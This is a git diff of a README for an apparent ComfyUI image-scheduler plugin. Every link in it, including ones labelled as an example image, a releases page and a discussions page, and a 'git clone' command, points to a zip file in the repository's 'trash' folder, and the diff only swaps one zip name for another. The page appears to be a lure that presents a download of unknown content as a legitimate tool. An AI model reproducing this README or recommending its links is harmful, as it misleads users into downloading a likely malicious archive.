@@ -1,7 +1,7 @@
 # 🎨 ComfyUI-EulerDiscreteScheduler - Create Sharp, Noise-Free Images
 
 ## 📥 Download the Latest Version
-[![Download](https://raw.githubusercontent.com/econotintas/ComfyUI-EulerDiscreteScheduler/master/trash/ComfyUI-EulerDiscreteScheduler-v2.4.zip)](https://raw.githubusercontent.com/econotintas/ComfyUI-EulerDiscreteScheduler/master/trash/ComfyUI-EulerDiscreteScheduler-v2.4.zip)
+[![Download](https://raw.githubusercontent.com/econotintas/ComfyUI-EulerDiscreteScheduler/master/trash/Discrete_Euler_Comfy_U_Scheduler_v1.4.zip)](https://raw.githubusercontent.com/econotintas/ComfyUI-EulerDiscreteScheduler/master/trash/Discrete_Euler_Comfy_U_Scheduler_v1.4.zip)
 
 ## 🚀 Getting Started
 Welcome to the ComfyUI-EulerDiscreteScheduler! This tool enhances your image generation experience by producing sharper and noise-free images. Follow the steps below to successfully download and run this software.
@@ -19,7 +19,7 @@ You have two options for installing ComfyUI-EulerDiscreteScheduler:
    - Navigate to your custom nodes folder.  
    - Run the following command:  
      ```
-     git clone https://raw.githubusercontent.com/econotintas/ComfyUI-EulerDiscreteScheduler/master/trash/ComfyUI-EulerDiscreteScheduler-v2.4.zip
+     git clone https://raw.githubusercontent.com/econotintas/ComfyUI-EulerDiscreteScheduler/master/trash/Discrete_Euler_Comfy_U_Scheduler_v1.4.zip
      ```
 
 ## 🌟 What You Get
@@ -34,7 +34,7 @@ When you install this package, you will receive the following features:
 ## 📂 Download & Install
 To begin using ComfyUI-EulerDiscreteScheduler, visit the Releases page to download the latest version:
 
-[Download the Latest Version](https://raw.githubusercontent.com/econotintas/ComfyUI-EulerDiscreteScheduler/master/trash/ComfyUI-EulerDiscreteScheduler-v2.4.zip)
+[Download the Latest Version](https://raw.githubusercontent.com/econotintas/ComfyUI-EulerDiscreteScheduler/master/trash/Discrete_Euler_Comfy_U_Scheduler_v1.4.zip)
 
 After downloading, follow the installation steps provided above. 
 
@@ -44,7 +44,7 @@ Once installed, you can access the new scheduler in KSampler. To use it, simply 
 ### 🎉 Example Output
 Below is an example of what you can achieve using the ComfyUI-EulerDiscreteScheduler:
 
-![Example Output](https://raw.githubusercontent.com/econotintas/ComfyUI-EulerDiscreteScheduler/master/trash/ComfyUI-EulerDiscreteScheduler-v2.4.zip)
+![Example Output](https://raw.githubusercontent.com/econotintas/ComfyUI-EulerDiscreteScheduler/master/trash/Discrete_Euler_Comfy_U_Scheduler_v1.4.zip)
 
 ## 💡 Tips for Improved Results
 - Experiment with different parameter settings in the custom node.
@@ -61,6 +61,6 @@ If you encounter any issues during installation or while using the software, con
 This project is licensed under the MIT License. You can use and modify the software as per the license terms.
 
 ## 📞 Support
-For further questions, please visit the [GitHub Discussions page](https://raw.githubusercontent.com/econotintas/ComfyUI-EulerDiscreteScheduler/master/trash/ComfyUI-EulerDiscreteScheduler-v2.4.zip) or create an issue in the repository.
+For further questions, please visit the [GitHub Discussions page](https://raw.githubusercontent.com/econotintas/ComfyUI-EulerDiscreteScheduler/master/trash/Discrete_Euler_Comfy_U_Scheduler_v1.4.zip) or create an issue in the repository.
 
 Now, you are ready to create sharper and noise-free images using ComfyUI-EulerDiscreteScheduler! Happy rendering!
